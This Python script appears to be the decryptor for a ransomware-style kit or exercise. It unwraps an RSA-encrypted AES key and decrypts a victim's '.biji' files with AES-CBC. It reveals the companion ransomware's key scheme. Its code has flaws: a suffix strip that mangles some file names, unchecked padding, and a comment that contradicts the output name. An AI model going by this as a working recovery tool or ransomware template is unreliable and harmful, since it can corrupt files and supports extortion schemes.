import os
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives import ciphers
from cryptography.hazmat.backends import default_backend

# Function to decrypt the AES key using the RSA private key
def decrypt_aes_key_with_rsa(private_key_path, encrypted_aes_key_path):
    # Load the RSA private key from the provided file path
    with open(private_key_path, "rb") as private_key_file:
        private_key = serialization.load_pem_private_key(
            private_key_file.read(), password=None, backend=default_backend()
        )

    # Load the encrypted AES key from the file
    with open(encrypted_aes_key_path, "rb") as encrypted_key_file:
        encrypted_aes_key = encrypted_key_file.read()

    # Decrypt the AES key using RSA private key with OAEP padding
    decrypted_aes_key = private_key.decrypt(
        encrypted_aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    # Save the decrypted AES key to a new file (victim1_aes_file_encryption.bin.DECRYPTED)
    with open("victim1_aes_file_encryption.bin", "wb") as aes_key_file:
        aes_key_file.write(decrypted_aes_key)

    print(">> AES key has been decrypted and saved as 'victim1_aes_file_encryption.bin'.")
    return decrypted_aes_key

# Function to decrypt an encrypted file using the decrypted AES key
def decrypt_file_using_aes(encrypted_file_path, decrypted_aes_key):
    # Read the encrypted file
    with open(encrypted_file_path, "rb") as encrypted_file:
        # Read the IV (first 16 bytes)
        iv = encrypted_file.read(16)
        encrypted_data = encrypted_file.read()

    # Initialize AES cipher with the decrypted AES key and IV
    cipher = ciphers.Cipher(ciphers.algorithms.AES(decrypted_aes_key), ciphers.modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()

    # Decrypt the data
    decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()

    # Unpad the decrypted data (remove padding added during encryption)
    pad_len = decrypted_data[-1]
    decrypted_data = decrypted_data[:-pad_len]

    # Generate the decrypted file name
    decrypted_file_path = encrypted_file_path.rstrip('.biji')
    
    # Write the decrypted data to the file
    with open(decrypted_file_path, "wb") as decrypted_file:
        decrypted_file.write(decrypted_data)

    print(f">> Decrypting file '{decrypted_file_path}' with AES key 'victim1_aes_file_encryption.bin'.")
    print(f">> The file has been decrypted and saved as '{decrypted_file_path}'.")

# Main function
def main():
    # Step 1: Prompt the user to provide the RSA private key file path
    private_key_path = input("== Enter the DECRYPTED RSA private key file name: ")

    # Step 2: Verify if the private key file exists
    if not os.path.isfile(private_key_path):
        print(f">> Private key file '{private_key_path}' does not exist. Exiting...")
        return

    # Step 3: Prompt the user to provide the encrypted AES key file path
    encrypted_aes_key_path = input("== Enter the encrypted AES key file name: ")

    # Step 4: Verify if the encrypted AES key file exists
    if not os.path.isfile(encrypted_aes_key_path):
        print(f">> Encrypted AES key file '{encrypted_aes_key_path}' does not exist. Exiting...")
        return

    # Step 5: Decrypt the AES key using the private key
    decrypted_aes_key = decrypt_aes_key_with_rsa(private_key_path, encrypted_aes_key_path)

    # Step 6: Prompt the user to provide the encrypted file path
    encrypted_file_path = input("== Enter the encrypted .BIJI file you want to decrypt (e.g., 'myfile.txt.biji'): ")

    # Step 7: Verify if the encrypted file exists
    if not os.path.isfile(encrypted_file_path):
        print(f">> Encrypted file '{encrypted_file_path}' does not exist. Exiting...")
        return

    # Step 8: Decrypt the encrypted file using the decrypted AES key
    decrypt_file_using_aes(encrypted_file_path, decrypted_aes_key)

if __name__ == "__main__":
    main()
